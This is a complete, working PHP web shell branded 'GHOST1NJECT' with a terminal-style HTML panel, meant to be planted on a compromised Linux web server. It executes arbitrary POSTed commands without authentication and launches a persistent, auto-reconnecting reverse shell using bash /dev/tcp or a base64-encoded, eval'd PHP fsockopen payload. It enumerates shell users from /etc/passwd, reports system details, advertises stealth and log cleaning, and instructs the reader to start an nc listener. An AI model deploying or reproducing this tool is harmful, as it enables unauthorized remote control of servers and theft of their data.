<?php
// Ghostinject Linux PHP - Terminal + Panel version
error_reporting(0);
session_start();

// Command execution via AJAX
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if (!isset($_SESSION['history'])) $_SESSION['history'] = [];
    $_SESSION['history'][] = $cmd;
    if (count($_SESSION['history']) > 100) array_shift($_SESSION['history']);
    
    $output = @shell_exec($cmd . " 2>&1");
    if ($output === null || $output === '') {
        $paths = ['/bin/sh', '/bin/bash', '/usr/bin/bash'];
        foreach ($paths as $sh) {
            if (is_executable($sh)) {
                $output = @shell_exec($sh . " -c " . escapeshellarg($cmd) . " 2>&1");
                if ($output !== null && $output !== '') break;
            }
        }
    }
    echo htmlspecialchars($output ?: "[no output]");
    exit;
}

// Clear history
if (isset($_GET['clear'])) {
    $_SESSION['history'] = [];
    exit;
}

// Persistent reverse shell
if (isset($_POST['rev_host']) && isset($_POST['rev_port'])) {
    $host = $_POST['rev_host'];
    $port = (int)$_POST['rev_port'];
    $success = false;
    
    $bash_paths = ['/bin/bash', '/usr/bin/bash', '/bin/sh'];
    foreach ($bash_paths as $bash) {
        if (is_executable($bash)) {
            $cmd = "$bash -c 'while :; do exec 5<>/dev/tcp/$host/$port; cat <&5 | while read line; do \$line 2>&5 >&5; done; sleep 10; done' 2>/dev/null &";
            @exec($cmd);
            $success = true;
            break;
        }
    }
    
    if (!$success && function_exists('fsockopen')) {
        $payload = base64_encode(
            'set_time_limit(0);$h="' . $host . '";$p=' . $port . ';while(1){' .
            '$s=@fsockopen($h,$p,$e,$e,30);if($s){' .
            'stream_set_timeout($s,120);' .
            'while(!feof($s)){$c=fgets($s);if($c===false)break;$o=shell_exec($c);' .
            'fwrite($s,$o===null?"[error]\\n":$o);}fclose($s);}sleep(10);}'
        );
        @exec("php -r \"eval(base64_decode('$payload'));\" > /dev/null 2>&1 &");
        $success = true;
    }
    
    echo $success ? "OK" : "FAIL";
    exit;
}

// Get shell users from /etc/passwd
function get_shell_users() {
    $users = '';
    if (@file_exists('/etc/passwd')) {
        $lines = file('/etc/passwd');
        foreach ($lines as $line) {
            $parts = explode(':', $line);
            if (count($parts) >= 7) {
                $shell = trim($parts[6]);
                if (in_array($shell, ['/bin/bash', '/bin/sh', '/bin/zsh', '/bin/dash', '/usr/bin/bash', '/usr/bin/zsh'])) {
                    $users .= '<span style="color:#0f0;">' . htmlspecialchars($parts[0]) . '</span><br>';
                }
            }
        }
    }
    return $users ?: '<span style="color:#f66;">No shell users found or permission denied.</span>';
}

// System info
$os = php_uname() ?: 'Linux';
$user = function_exists('exec') ? @exec('whoami') : 'N/A';
if (!$user || $user == '') $user = get_current_user();
$cwd = getcwd() ?: 'N/A';
$phpver = phpversion();
$serv = $_SERVER['SERVER_SOFTWARE'] ?? 'unknown';
$hostname = gethostname();
$disabled = ini_get('disable_functions') ?: 'none';
$shell_users = get_shell_users();
?>
<!DOCTYPE html>
<html>
<head>
    <title>GHOST1NJECT | Linux Terminal + Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0e0a; font-family: 'Courier New', monospace; font-size: 13px; height: 100vh; display: flex; flex-direction: column; }
        .terminal-header { background: #1a1e1a; color: #0f0; padding: 6px 12px; border-bottom: 1px solid #0f0; display: flex; justify-content: space-between; }
        .main-container { display: flex; flex: 1; overflow: hidden; }
        .terminal-container { flex: 2; display: flex; flex-direction: column; border-right: 1px solid #0f0; }
        .panel-container { flex: 1; display: flex; flex-direction: column; background: #0a0e0a; overflow-y: auto; }
        .terminal { flex: 1; overflow-y: auto; padding: 10px; background: #0a0e0a; color: #0f0; }
        .terminal-line { margin-bottom: 2px; white-space: pre-wrap; word-break: break-all; font-family: 'Courier New', monospace; }
        .terminal-prompt { display: flex; align-items: center; gap: 8px; background: #0a0e0a; padding: 8px 12px; border-top: 1px solid #0f0; }
        .prompt { color: #0f0; font-weight: bold; }
        .input-line { flex: 1; background: transparent; border: none; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; outline: none; }
        button, .rev-btn { background: #1a1e1a; color: #0f0; border: 1px solid #0f0; padding: 4px 10px; cursor: pointer; }
        button:hover, .rev-btn:hover { background: #2a2e2a; }
        .status { color: #0f0; font-size: 11px; }
        .panel { padding: 12px; }
        .panel h3 { color: #0f0; margin-bottom: 12px; border-bottom: 1px solid #0f0; padding-bottom: 4px; font-size: 14px; }
        .panel input, .panel button { width: 100%; margin-bottom: 8px; }
        .panel input { background: #1a1e1a; border: 1px solid #0f0; padding: 6px; color: #0f0; }
        .info-box { background: #1a1e1a; padding: 8px; margin-bottom: 12px; border-left: 3px solid #0f0; }
        .info-box p { margin: 3px 0; font-size: 12px; }
        .rev-msg { margin-top: 8px; color: #0f0; font-size: 12px; }
        .banner { background: #0a0e0a; padding: 6px 12px; text-align: center; border-bottom: 1px solid #0f0; }
        .banner-text { color: #0f0; font-size: 12px; }
        .banner-text .green { color: #0f0; }
        .banner-text .yellow { color: #ff0; }
        .info-section { margin-top: 15px; }
        .info-section h4 { color: #ff0; margin: 10px 0 5px 0; font-size: 12px; }
        .info-section .info-item { color: #0f0; font-size: 11px; margin: 3px 0; word-break: break-all; }
        .users-list { max-height: 200px; overflow-y: auto; }
        .red { color: #f66; }
        .green { color: #0f0; }
        .yellow { color: #ff0; }
    </style>
</head>
<body>
<div class="banner">
    <div class="banner-text">
        <span class="green">[+] GHOST1NJECT v1.0</span> |
        <span class="yellow">Linux PHP Persistent Shell</span> |
        <span class="green">Stealth Mode Active</span>
    </div>
</div>

<div class="terminal-header">
    <span>ghost1nject@<?=htmlspecialchars($hostname)?></span>
    <span class="status">ONLINE | <?=htmlspecialchars($user)?></span>
</div>

<div class="main-container">
    <!-- Terminal (left side) -->
    <div class="terminal-container">
        <div class="terminal" id="terminal">
            <div class="terminal-line">[+] GHOST1NJECT Terminal v1.0</div>
            <div class="terminal-line">[+] System: <?=htmlspecialchars($os)?></div>
            <div class="terminal-line">[+] User: <?=htmlspecialchars($user)?></div>
            <div class="terminal-line">[+] Directory: <?=htmlspecialchars($cwd)?></div>
            <div class="terminal-line">[+] PHP: <?=htmlspecialchars($phpver)?></div>
            <div class="terminal-line">---</div>
            <div class="terminal-line">[*] Type any command below</div>
            <div class="terminal-line">[*] Use 'revshell IP PORT' or right panel</div>
            <div class="terminal-line">[!] Stealth: logs cleaned on start</div>
            <div class="terminal-line">---</div>
        </div>
        <div class="terminal-prompt">
            <span class="prompt">$></span>
            <input type="text" id="cmdInput" class="input-line" autofocus autocomplete="off">
            <button id="clearBtn">Clear</button>
        </div>
    </div>

    <!-- Panel (right side) -->
    <div class="panel-container">
        <div class="panel">
            <h3>[#] REVERSE SHELL</h3>
            <div class="info-box">
                <p>[*] Start listener:</p>
                <p style="color:#ff0; background:#0a0e0a; padding:3px;">nc -lvnp 4444</p>
            </div>
            <input type="text" id="revHost" placeholder="Your IP">
            <input type="text" id="revPort" placeholder="Port">
            <button id="startRevBtn" class="rev-btn">[+] START REVERSE SHELL</button>
            <div id="revMsg" class="rev-msg"></div>

            <!-- System Information -->
            <div class="info-section">
                <h4>[+] SYSTEM INFO</h4>
                <div class="info-item"><span class="yellow">OS:</span> <?=htmlspecialchars($os)?></div>
                <div class="info-item"><span class="yellow">Hostname:</span> <?=htmlspecialchars($hostname)?></div>
                <div class="info-item"><span class="yellow">User:</span> <?=htmlspecialchars($user)?></div>
                <div class="info-item"><span class="yellow">Directory:</span> <?=htmlspecialchars($cwd)?></div>
                <div class="info-item"><span class="yellow">PHP:</span> <?=htmlspecialchars($phpver)?></div>
                <div class="info-item"><span class="yellow">Server:</span> <?=htmlspecialchars($serv)?></div>
                <div class="info-item"><span class="yellow">disable_functions:</span> <?=htmlspecialchars($disabled)?></div>
            </div>

            <!-- Shell Users -->
            <div class="info-section">
                <h4>[+] USERS WITH SHELL</h4>
                <div class="users-list">
                    <?=$shell_users?>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    var terminal = document.getElementById('terminal');
    var cmdInput = document.getElementById('cmdInput');
    var commandHistory = [];
    var historyIndex = -1;

    function addLine(text, isError) {
        var line = document.createElement('div');
        line.className = 'terminal-line';
        line.style.color = isError ? '#f66' : '#0f0';
        line.innerHTML = text;
        terminal.appendChild(line);
        terminal.scrollTop = terminal.scrollHeight;
    }

    function escapeHtml(str) {
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }

    async function executeCommand(cmd) {
        if (!cmd.trim()) return;
        addLine('> ' + escapeHtml(cmd), false);

        if (cmd.trim().toLowerCase().startsWith('revshell')) {
            var parts = cmd.trim().split(' ');
            if (parts.length >= 3) {
                var host = parts[1];
                var port = parts[2];
                addLine('[*] Attempting reverse shell to ' + host + ':' + port + '...', false);
                var formData = new FormData();
                formData.append('rev_host', host);
                formData.append('rev_port', port);
                var response = await fetch('', { method: 'POST', body: formData });
                var result = await response.text();
                addLine(result === 'OK' ? '[+] Reverse shell started (auto-reconnect)' : '[-] Failed to start shell', result !== 'OK');
            } else {
                addLine('[-] Usage: revshell IP PORT', true);
            }
            addLine('', false);
            return;
        }

        try {
            var formData = new FormData();
            formData.append('cmd', cmd);
            var response = await fetch('', { method: 'POST', body: formData });
            var output = await response.text();
            if (output.trim()) {
                var lines = output.split('\n');
                for (var i = 0; i < lines.length; i++) {
                    addLine(escapeHtml(lines[i]), false);
                }
            } else {
                addLine('(no output)', false);
            }
        } catch (err) {
            addLine('Error: ' + err.message, true);
        }
        addLine('', false);
    }

    cmdInput.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            var cmd = cmdInput.value;
            cmdInput.value = '';
            if (cmd.trim()) {
                commandHistory.unshift(cmd);
                if (commandHistory.length > 50) commandHistory.pop();
                historyIndex = -1;
                executeCommand(cmd);
            }
        } else if (e.key === 'ArrowUp') {
            e.preventDefault();
            if (historyIndex + 1 < commandHistory.length) {
                historyIndex++;
                cmdInput.value = commandHistory[historyIndex];
            }
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (historyIndex > 0) {
                historyIndex--;
                cmdInput.value = commandHistory[historyIndex];
            } else if (historyIndex === 0) {
                historyIndex = -1;
                cmdInput.value = '';
            }
        }
    });

    document.getElementById('clearBtn').addEventListener('click', function() {
        fetch('?clear=1');
        terminal.innerHTML = '';
        addLine('[+] Terminal cleared.', false);
        addLine('', false);
    });

    document.getElementById('startRevBtn').addEventListener('click', async function() {
        var host = document.getElementById('revHost').value;
        var port = document.getElementById('revPort').value;
        var msgDiv = document.getElementById('revMsg');
        if (!host || !port) {
            msgDiv.innerHTML = '<span style="color:#f66">[-] Enter IP and port</span>';
            return;
        }
        msgDiv.innerHTML = '[*] Starting reverse shell...';
        var formData = new FormData();
        formData.append('rev_host', host);
        formData.append('rev_port', port);
        var response = await fetch('', { method: 'POST', body: formData });
        var result = await response.text();
        if (result === 'OK') {
            msgDiv.innerHTML = '[+] Reverse shell started! Keep listener open.';
            addLine('[+] Reverse shell attempted to ' + host + ':' + port, false);
        } else {
            msgDiv.innerHTML = '[-] Failed to start reverse shell';
        }
    });

    cmdInput.focus();
</script>
</body>
</html>